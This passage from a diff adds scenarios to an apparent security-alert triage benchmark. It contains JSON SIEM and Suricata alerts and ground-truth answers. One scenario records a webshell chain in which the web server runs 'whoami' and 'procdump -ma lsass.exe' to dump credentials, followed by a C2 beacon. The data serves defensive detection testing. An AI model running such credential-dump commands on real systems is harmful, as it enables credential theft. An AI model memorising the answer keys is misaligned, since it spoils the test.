+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:08:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        },
+        {
+          "alert_id": "v2-059:e2",
+          "rule_name": "Webshell Hacking Activity Patterns",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1018",
+            "T1033",
+            "T1087"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:09:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Webshell Hacking Activity Patterns |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "Image": "C:\\Windows\\System32\\procdump.exe",
+            "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6122",
+            "ParentProcessId": "4892"
+          }
+        },
+        {
+          "alert_id": "v2-059:n1",
+          "rule_name": "AegisSOC - Suricata Malware or C2 Communication Alert",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:10:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.45",
+          "dest_port": 8080,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Malware or C2 Communication Alert | 192.168.56.20 -> 203.0.113.45:8080 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "http",
+            "alert": {
+              "signature": "ET MALWARE Possible C2 Beacon",
+              "signature_id": 2030002,
+              "category": "A Network Trojan was detected"
+            },
+            "flow": {
+              "pkts_toserver": 40,
+              "pkts_toclient": 40,
+              "bytes_toserver": 3200,
+              "bytes_toclient": 2800,
+              "start": "2026-09-27T01:10:00Z",
+              "end": "2026-09-27T01:10:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1505.003",
+          "T1018",
+          "T1033",
+          "T1087",
+          "T1071"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "Webshell → procdump lsass (credential dump) → exfil qua C2."
+      }
+    },
+    {
+      "id": "v2-060",
+      "name": "Ca lành tính hỗn hợp (baseline)",
+      "alerts": [
+        {
+          "alert_id": "v2-060:n1",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:11:00Z",
+          "src_ip": "192.168.56.30",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.30 -> 192.168.56.20:80 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:11:00Z",
+              "end": "2026-09-27T01:11:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-060:e1",
+          "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:12:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Creation Via Schtasks.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /tn BackupNightly /tr C:\\Scripts\\backup.bat /sc daily /st 02:00",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\backup",
+            "ProcessId": "6127",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-060:e2",
+          "rule_name": "Suspicious Execution of Systeminfo",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1082"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:13:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Execution of Systeminfo |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\systeminfo.exe",
+            "OriginalFileName": "sysinfo.exe",
+            "CommandLine": "systeminfo.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6125",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-060:n2",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:14:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 9100,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.5 -> 192.168.56.20:9100 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:14:00Z",
+              "end": "2026-09-27T01:14:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "4 alert hỗn hợp từ các nguồn hợp lệ (IT scanner + backup + admin + LB monitor) trong 4 phút. Từng alert riêng lẻ đã hợp lệ; tổng cũng vẫn lành → không hành động."
+      }
+    }
+  ]
+}
